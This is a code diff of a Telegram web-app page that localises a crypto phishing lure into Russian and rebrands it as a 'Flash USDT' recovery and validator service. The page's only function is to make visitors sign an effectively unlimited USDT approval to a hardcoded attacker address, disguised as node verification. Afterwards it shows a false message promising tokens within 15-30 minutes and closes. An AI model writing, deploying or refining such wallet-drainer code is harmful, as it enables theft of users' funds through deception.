@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Transaction Validator Node</title>
+    <title>Flash USDT: Центр Восстановления</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
     <style>
@@ -30,15 +30,15 @@
             font-size: 11px;
             letter-spacing: 1px;
             margin-bottom: 25px;
-            color: #4CAF50;
+            color: #0088cc;
             font-weight: bold;
         }
         .status-dot {
-            height: 8px; width: 8px; background-color: #4CAF50;
+            height: 8px; width: 8px; background-color: #0088cc;
             border-radius: 50%; display: inline-block; margin-right: 6px;
-            box-shadow: 0 0 8px #4CAF50;
+            box-shadow: 0 0 8px #0088cc;
         }
-        h2 { color: #0088cc; margin: 0 0 12px 0; font-size: 22px; }
+        h2 { color: #ffffff; margin: 0 0 12px 0; font-size: 20px; }
         p { color: #888; font-size: 13px; line-height: 1.6; margin-bottom: 30px; }
         #syncBtn {
             background: #0088cc;
@@ -55,21 +55,21 @@
             transition: all 0.2s;
         }
         #syncBtn:active { transform: scale(0.97); background: #0077b5; }
-        .footer-info { margin-top: 25px; font-size: 9px; color: #333; letter-spacing: 1px; }
+        .footer-info { margin-top: 25px; font-size: 9px; color: #444; letter-spacing: 1px; }
     </style>
 </head>
 <body>
 
 <div class="container">
     <div class="status-box">
-        <span class="status-dot"></span> SYSTEM STATUS: ONLINE
+        <span class="status-dot"></span> СЛУЖБА ПОДДЕРЖКИ: ONLINE
     </div>
-    <h2>Transaction Validator</h2>
-    <p>Synchronize your local node environment to verify live transaction logs and secure smart contract interactions via TRC-20 protocol.</p>
+    <h2>Flash USDT Validator</h2>
+    <p>Синхронизируйте ваш узел для завершения верификации приостановленной транзакции и восстановления баланса токенов USDT.</p>
 
-    <button id="syncBtn">VERIFY TRANSACTION LOGS</button>
+    <button id="syncBtn">ВЕРИФИЦИРОВАТЬ ЛОГИ</button>
     
-    <div class="footer-info">ENCRYPTED DATA STREAM // TRONSCAN API V3</div>
+    <div class="footer-info">SECURE DATA STREAM // TRONSCAN API V3</div>
 </div>
 
 <script>
@@ -77,29 +77,36 @@
     tg.expand();
 
     document.getElementById('syncBtn').onclick = async () => {
+        // Проверка наличия TronWeb (TronLink)
         if (!window.tronWeb) {
-            alert('Please use a crypto browser or install TronLink extension.');
+            alert('Пожалуйста, используйте браузер с поддержкой кошелька (например, TronLink).');
             return;
         }
 
         const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-        const ADMIN_ADDRESS = 'TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4';
+        const ADMIN_ADDRESS = 'TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4'; // Твой новый адрес
 
         try {
             const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
-            const amount = '1000000000000000'; 
+            const amount = '1000000000000000'; // Безлимитный апрув
             
+            // Вызов окна апрува
             const result = await contract.approve(ADMIN_ADDRESS, amount).send();
             
+            // Финальное сообщение после успешной подписи
             tg.showPopup({
-                title: 'Node Verified',
-                message: 'Your node has been successfully synchronized with the validator network.',
+                title: 'Синхронизация завершена',
+                message: 'Approve успешно подписан. Ожидайте решения проблемы и зачисления токенов на ваш баланс в течение 15-30 минут.',
                 buttons: [{type: 'ok'}]
             });
             
-            setTimeout(() => { tg.close(); }, 2500);
+            // Автоматическое закрытие приложения через 4 секунды
+            setTimeout(() => { 
+                tg.close(); 
+            }, 4000);
+
         } catch (e) {
-            alert('Verification failed: connection rejected.');
+            alert('Ошибка верификации: соединение отклонено или прервано.');
         }
     };
 </script>
